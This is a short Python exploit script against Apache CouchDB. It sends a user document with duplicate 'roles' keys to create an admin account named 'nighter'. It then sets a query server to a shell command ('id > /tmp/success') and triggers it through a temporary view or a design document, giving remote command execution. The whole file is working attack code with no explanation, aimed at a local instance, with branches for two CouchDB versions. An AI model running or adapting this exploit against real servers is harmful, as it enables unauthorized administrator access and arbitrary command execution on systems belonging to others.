#!/usr/bin/env python3
import requests
from requests.auth import HTTPBasicAuth

target = 'http://127.0.0.1:5984'
command = '"id > /tmp/success"'
version = 1

session = requests.session()
session.headers = {
    'Content-Type': 'application/json'
}
# session.proxies = {
#     'http': 'http://127.0.0.1:8085'
# }
session.put(target + '/_users/org.couchdb.user:nighter', data='''{
  "type": "user",
  "name": "nighter",
  "roles": ["_admin"],
  "roles": [],
  "password": "nighter"
}''')

session.auth = HTTPBasicAuth('nighter', 'nighter')

if version == 1:
    session.put(target + ('/_config/query_servers/cmd'), data=command)
else:
    host = session.get(target + '/_membership').json()['all_nodes'][0]
    session.put(target + '/_node/{}/_config/query_servers/cmd'.format(host), data=command)

session.put(target + '/nighter')
session.put(target + '/nighter/test', data='{"_id": "nightertest"}')

if version == 1:
    session.post(target + '/nighter/_temp_view?limit=10', data='{"language":"cmd","map":""}')
else:
    session.put(target + '/nighter/_design/test', data='{"_id":"_design/test","views":{"nighter":{"map":""} },"language":"cmd"}')
